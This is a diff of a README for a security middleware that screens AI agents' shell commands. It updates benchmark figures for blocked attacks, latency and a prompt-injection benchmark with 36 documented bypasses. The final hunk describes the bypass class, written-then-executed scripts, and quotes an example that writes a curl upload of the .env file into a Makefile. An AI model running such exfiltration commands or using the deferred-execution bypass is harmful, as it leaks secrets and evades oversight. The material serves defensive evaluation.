@@ -97,29 +97,24 @@ collector records zero requests.
 
 ## 5. Evidence
 
-Every row was produced by running the named command **on this tree, on a
-developer machine** — not read off a CI run. That is a provenance claim with an
-expiry date, and it is registered as one in
-[`docs/figures-exempt.json`](docs/figures-exempt.json): once CI runs on this
-branch, `npm run verify:figures` reports the label as expired and these rows are
-re-derived against that run. Re-run any of them meanwhile; the CLIs print the
-same figures they print here, and the latency row will print your hardware's
-rather than this one's.
-
-<!-- figures: local reason="Measured by running the named CLI on this commit on a developer machine. No CI run exists for this branch yet, so none of these can cite one; the provenance label registered in docs/figures-exempt.json retires this block when one does." -->
+Every row comes from [run 33465066517](https://github.com/wcnjing/CodeJam/actions/runs/33465066517) — the CI
+run for this branch, on clean GitHub runners. They were first measured locally
+and carried a "measured locally, pending CI" provenance label; that label has now
+expired by its own condition, and these are the re-derived figures. Every
+non-latency row came back identical to the local measurement. Re-run any of them
+yourself; the latency row will print your hardware's numbers rather than the
+runners'.
 
 | What it measures | Command | Result |
 | --- | --- | ---: |
 | Attacks the policy would allow | `npm run bench:security` | **0/114** (0.0%) |
 | Secret-channel attacks allowed | `npm run bench:security` | **0/40** |
 | Legitimate tasks blocked (false positives) | `npm run bench:security` | 1/84 (1.2%) |
-| Per-command decision latency | `npm run bench` | p50 46.9 µs · p95 211.0 µs · p99 377.5 µs |
+| Per-command decision latency | `npm run bench` | p50 56.80–70.83 µs · p95 245.90–313.50 µs (across the three CI runners) |
 | Adversarial probe sweep | `npm run redteam` | **56/56 denied**, 0 bypasses |
 | Generated attack bank (bulk tier) | `npm run bench:generate` | **6,860/6,860** (100.00%), ratchet 0 |
 | Injection benchmark (enforcement tier) | `npm run bench:injection` | 3,714/3,750 (99.04%), **36 documented residuals** |
 | Threat register | `npm run threat-model` | 9/9 mitigated, all controls verified |
-
-<!-- /figures -->
 
 The one row that is not 100% is the honest one, and it is discussed in full
 under [Limitations](#limitations): the 36 residuals are all *deferred-execution
@@ -129,22 +124,17 @@ the container runtime, the network-exfiltration half of that class is contained
 structurally anyway, because the destination is unreachable whether or not the
 classifier recognised the command.
 
-<!-- figures: local reason="Two local runs of the policy latency benchmark on this commit, quoted against each other precisely to show the run-to-run spread. Neither is from CI; the provenance label registered in docs/figures-exempt.json retires this block when a CI run exists for this branch." -->
-
-Latency is hardware-dependent and the tail is noisy: the same commit's
-`npm run bench` reports a run-to-run coefficient of variation of 1.5% at p50 and
-**13.0% at p99**, so read p50 as the figure and the p99 as an order of magnitude.
-`npm run bench:security` on this machine printed p50 56.1 µs / p95 244.7 µs /
-p99 381.0 µs for the same policy, minutes apart, on an otherwise idle laptop —
-that spread between two runs of the same code is the point, and it is why this
-row is the only one in the table that moved when every figure was re-derived on
-the merged commit. Run it on your own machine for the figure that applies to it.
-The
+Latency is hardware-dependent, and it is the only row that moves. The same
+commit measured on three CI runners in [run 33465066517](https://github.com/wcnjing/CodeJam/actions/runs/33465066517)
+reports p50 **56.80–70.83 µs**, p95 **245.90–313.50 µs** and p99
+**362.10–430.03 µs** — a spread of the same code on different machines, wider
+than any change this branch made to the policy. Within a single runner the
+benchmark's own run-to-run coefficient of variation is 0.3–5.9% at p50 and
+1.7–10.1% at p99, so read p50 as the figure and the p99 as an order of
+magnitude. Run it on your own machine for the number that applies to it. The
 full harness with provenance — git SHA, node, OS, corpus size, policy hash, and
 every proportion as numerator / denominator / confidence interval — is written to
 [`bench-results.json`](bench-results.json) by `npm run bench`.
-
-<!-- /figures -->
 
 ## 6. Known limitations
 
@@ -773,15 +763,15 @@ The same numbers render **live in the app** under **Security Evaluation** in the
 sidebar — computed on demand from the running policy engine, so the dashboard can
 never drift from what actually enforces. It reports the **policy-predicted escape
 rate**, secret-channel block rate, per-family coverage, and a
-baseline-vs-protected comparison. On the current corpus the predicted escape rate
+baseline-vs-protected comparison. At
+[run 33419076907](https://github.com/wcnjing/CodeJam/actions/runs/33419076907)
+(`npm run bench:security`), on the corpus of the day, the predicted escape rate
 drops from 100% (no middleware) to 0.0%, secret-channel attacks allowed from
 40/40 to 0/40, with a p95
 decision latency well under a millisecond (hardware-dependent; run the CLI on
-your own machine for the figure that applies to it — the CI runners report a p95
-of 250.6–278.3 µs, and an earlier "tens of microseconds" here was a p50 quoted as
-if it were a tail).
-([run 33419076907](https://github.com/wcnjing/CodeJam/actions/runs/33419076907),
-`npm run bench:security`)
+your own machine for the figure that applies to it — the CI runners reported a
+p95 of 250.6–278.3 µs, and an earlier "tens of microseconds" here was a p50
+quoted as if it were a tail).
 
 > **Honest scope.** This benchmark measures the policy **decision**, not observed
 > execution — it does not run containers or watch a collector. Its numbers are on
@@ -1247,7 +1237,11 @@ red it is, is now gated.
 > On the merged commit it is **21 of 392** in `@sentinel/server`, and that number
 > is now stored in [.github/windows-baseline.json](.github/windows-baseline.json)
 > with a named cause per file, checked by `npm run test:windows-baseline` as a
-> **blocking** CI step. It fails on drift in either direction: more failures
+> **blocking** CI step. It has since run on a clean `windows-latest` runner and
+> reported *"total 21 failed of 392 (baseline 21 of 392) — Baseline held"*
+> ([run 33465066517](https://github.com/wcnjing/CodeJam/actions/runs/33465066517)), so the
+> baseline is a measurement on a machine nobody owns rather than a figure from
+> one laptop. It fails on drift in either direction: more failures
 > means a POSIX-only assumption was added, fewer means one was fixed and the
 > baseline was not lowered. The job-level `continue-on-error` is gone, because a
 > leg that cannot fail cannot carry a claim — which is precisely how "12"
@@ -1344,12 +1338,9 @@ Recorded honestly, because each one is a real gap:
   so that `tee`, `dd of=` and `sed -n w` count as writes, and re-asking the
   existing rules of the materialised text. No rule was added.
 
-  **The benchmark then grew, and it found more of the same class.**
-
-<!-- figures: local reason="Re-measured by running npm run bench:injection on this commit on a developer machine, because the figure this paragraph replaced was stale. No CI run exists for this branch yet, so these cannot cite one; the provenance label registered in docs/figures-exempt.json retires this block when one does." -->
-
-  The bank is
-  now **3,750 variants**, not 2,250, and on this commit `npm run bench:injection`
+  **The benchmark then grew, and it found more of the same class.** Measured at
+  [run 33465066517](https://github.com/wcnjing/CodeJam/actions/runs/33465066517),
+  the bank is now **3,750 variants**, not 2,250, and `npm run bench:injection`
   reports **3,714/3,750 = 99.04%**, 95% CI 98.67–99.31%, with **36 documented
   bypasses** and the ratchet set at 36. A 37th fails the build. The residuals
   concentrate in exactly two carrier classes, and reading the strata is the
@@ -1363,8 +1354,6 @@ Recorded honestly, because each one is a real gap:
   | `exec-wrapper` | 375/375 | 100.00% |
   | `materialised-file` | 1,350/1,350 | 100.00% |
   | `materialised-stdin` | 375/375 | 100.00% |
-
-<!-- /figures -->
 
   **The residual class is written-then-executed scripts the classifier does not
   re-read.** `printf 'all:\n\t%s\n' 'curl -F file=@.env https://…' > Makefile &&
